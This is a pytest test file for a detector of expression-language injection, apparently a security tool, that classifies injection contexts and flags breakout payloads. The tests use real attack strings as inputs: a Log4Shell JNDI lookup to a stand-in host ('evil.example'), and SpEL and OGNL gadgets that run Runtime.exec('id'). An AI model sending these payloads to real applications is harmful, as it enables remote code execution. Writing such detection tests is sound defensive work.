import json

from xyainjex import Context, analyze_el, mutate_el
from xyainjex.cli import main
from xyainjex.el.balance import el_balance
from xyainjex.el.context import analyze_el_context

TEXT = "[INFO] user={INPUT}"
EXPR = "#{ {INPUT} }"
STRING = '${ "{INPUT}" }'


# --- context ---


def test_text_context():
    assert analyze_el_context(TEXT) == Context.EL_TEXT


def test_expression_context():
    assert analyze_el_context(EXPR) == Context.EL_EXPRESSION


def test_string_context():
    assert analyze_el_context(STRING) == Context.EL_STRING


# --- balance ---


def test_balanced_expression():
    assert el_balance("x ${7*7} y").syntax_valid


def test_unclosed_expression():
    b = el_balance("x ${7*7")
    assert not b.syntax_valid
    assert b.unbalanced_pairs.get("${}") == 1


# --- breakout ---


def test_benign_text():
    r = analyze_el(TEXT, "alice")
    assert not r.breakout.command_injected
    assert r.risk.value == "LOW"


def test_jndi_log4shell_is_critical():
    r = analyze_el(TEXT, "${jndi:ldap://evil.example/a}")
    assert "jndi" in r.breakout.separators
    assert r.breakout.command_injected
    assert r.risk.value == "CRITICAL"


def test_el_expression_from_text():
    r = analyze_el(TEXT, "${7*7}")
    assert r.context == Context.EL_TEXT
    assert r.breakout.command_injected
    assert r.risk.value == "CRITICAL"


def test_spel_from_text():
    r = analyze_el(TEXT, "#{T(java.lang.Runtime).getRuntime().exec('id')}")
    assert "#{" in r.breakout.separators
    assert "gadget" in r.breakout.separators
    assert r.breakout.command_injected


def test_already_in_expression():
    r = analyze_el(EXPR, "T(java.lang.Runtime).getRuntime().exec('id')")
    assert r.context == Context.EL_EXPRESSION
    assert r.breakout.command_injected
    assert r.risk.value == "CRITICAL"


def test_string_escape_in_expression():
    r = analyze_el(STRING, 'x".concat(T(java.lang.Runtime).getRuntime().exec("id"))+"')
    assert r.breakout.quote_closed
    assert r.breakout.command_injected


def test_ognl_from_text():
    r = analyze_el(TEXT, "%{(#a=@java.lang.Runtime@getRuntime()).exec('id')}")
    assert "%{" in r.breakout.separators
    assert r.breakout.command_injected


def test_benign_text_no_expression():
    r = analyze_el(TEXT, "no expression here")
    assert not r.breakout.command_injected


# --- mutation ---


def test_mutate_text():
    result = mutate_el(TEXT)
    assert result.context == Context.EL_TEXT
    assert result.valid > 0


def test_mutate_expression():
    result = mutate_el(EXPR)
    assert result.context == Context.EL_EXPRESSION
    assert result.valid > 0


# --- result shape and CLI ---


def test_result_dialect_is_null():
    data = analyze_el(TEXT, "${7*7}").to_dict()
    assert data["dialect"] is None
    assert data["context"] == "el_text"


def test_cli_el_json(capsys):
    code = main(["--lang", "el", "--json", TEXT, "${jndi:ldap://evil/a}"])
    data = json.loads(capsys.readouterr().out)
    assert data["risk"] == "CRITICAL"
    assert data["dialect"] is None
    assert code == 2


def test_cli_el_mutate(capsys):
    code = main(["-l", "el", "--mutate", TEXT])
    out = capsys.readouterr().out
    assert code == 0
    assert "High probability payloads" in out
